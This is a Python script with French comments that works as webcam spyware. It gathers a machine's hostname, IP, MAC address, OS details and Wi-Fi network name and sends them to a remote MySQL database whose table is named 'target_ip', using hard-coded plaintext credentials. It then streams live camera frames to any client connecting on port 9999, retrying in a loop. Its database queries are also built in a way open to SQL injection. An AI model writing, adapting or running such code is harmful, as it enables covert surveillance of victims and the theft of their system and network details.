import cv2
import socket
import pickle
import struct
import time
import mysql.connector
import platform
from getmac import get_mac_address
import subprocess

def get_system_info_ext():
    # Nom d'hôte
    host_name = socket.gethostname()
    # Adresse IP
    ip_address = socket.gethostbyname(host_name)
    # Adresse MAC
    mac_address = get_mac_address()
    # Système d'exploitation
    os_name = platform.system()
    # Version du système d'exploitation
    os_version = platform.version()
    # Affichage des résultats
    computer_data = [host_name, ip_address, mac_address, os_name, os_version]
    return computer_data


def get_connected_wifi_network():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True, check=True, encoding='latin-1')
        output_lines = result.stdout.splitlines()
        for line in output_lines:
            if 'SSID' in line:
                return line.split(': ')[1].strip()
    except subprocess.CalledProcessError as e:
        print("Erreur lors de l'exécution de la commande : ", e)

def connect_to_database():
    try:
        conn = mysql.connector.connect(
            host="46.105.155.130",
            port=3306,
            user="u1133_XDDiX8qxHl",
            password="WQ6A=fKw4Rsvf!poL2FM36fG",
            database="s1133_AdminPanel"
        )
        return conn
    except mysql.connector.Error as err:
        print("Error:", err)
        return None

def close_connection(conn):
    if conn:
        conn.close()

# Adresse IP et port du serveur
host_ip = socket.gethostbyname(socket.gethostname())
port = 9999

conn = connect_to_database()
if conn:
    try:
        cursor = conn.cursor()
        
        cursor.execute(f'SELECT COUNT(*) FROM target_ip WHERE ip = "{host_ip}" AND network = "{get_connected_wifi_network()}"')
        row_count = cursor.fetchone()[0]
        
        if row_count == 0:
            cursor.execute(f'INSERT INTO target_ip (`ip`, `computers_data`, `network`, `date`) VALUES ("{host_ip}", "{get_system_info_ext()}", "{get_connected_wifi_network()}", NOW())')
            conn.commit()        
        cursor.close()
    finally:
        close_connection(conn)

# Configuration de la caméra
cap = cv2.VideoCapture(0)

while True:
    try:
        # Création du socket serveur
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((host_ip, port))
        s.listen(1)
        print(f"Serveur démarré sur {host_ip}:{port}")

        # Accepter la connexion entrante
        conn_lh, addr = s.accept()
        print(f"Connexion établie avec {addr}")

        while True:
            ret, frame = cap.read()
            if ret:
                # Encodage du cadre en binaire
                data = pickle.dumps(frame)
                # Envoi des données au client
                conn_lh.sendall(struct.pack("L", len(data)) + data)
    except (socket.error, ConnectionResetError):
        print("La connexion a été interrompue. Tentative de reconnexion dans 5 secondes...")
        time.sleep(5)  # Attendre 5 secondes avant de réessayer
        continue
    finally:
        # Fermeture de la connexion et de la caméra
        conn_lh.close()
        cap.release()
